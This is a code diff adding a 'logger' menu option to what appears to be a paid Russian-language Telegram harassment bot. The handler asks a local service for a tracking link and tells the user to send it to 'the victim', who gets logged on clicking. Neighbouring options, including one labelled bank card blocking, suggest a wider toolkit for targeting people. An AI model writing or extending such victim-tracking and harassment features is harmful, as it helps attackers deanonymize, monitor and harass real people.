@@ -1531,6 +1531,35 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				"— Кратко опишите нарушение",
 				parse_mode="Markdown", reply_markup=back_markup)
 
+		# ─── Логгер ───────────────────────────────────────────────────────────────
+		elif d == "logger_method":
+			if bot_off():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Бот выключен\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			if sub_expired():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Нужна подписка\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			# Создаём ссылку через внутренний API логгера
+			try:
+				async with aiohttp.ClientSession() as _s:
+					async with _s.get(f"http://127.0.0.1:8080/create/{uid}",
+						timeout=aiohttp.ClientTimeout(total=5)) as _r:
+						data = await _r.json()
+				link = data["url"]
+				link_escaped = link.replace('.', '\\.').replace('-', '\\-')
+				await bot_instance.edit_message_caption(
+					call.message.chat.id, call.message.message_id,
+					caption=(
+						f"🔗 *Логгер*\n\n"
+						f"*Ваша ссылка:*\n`{link}`\n\n"
+						f"*└─ Отправьте её жертве*\n"
+						f"*└─ Как только кто\\-то перейдёт — вам придёт уведомление*"
+					),
+					parse_mode="MarkdownV2", reply_markup=back_markup
+				)
+			except Exception as e:
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id,
+					caption=f">❌ *Ошибка логгера: сервер недоступен*",
+					parse_mode="MarkdownV2", reply_markup=back_markup)
+
 		# ─── Блокировка карты ─────────────────────────────────────────────────
 		elif d == "bank_method":
 			if bot_off():
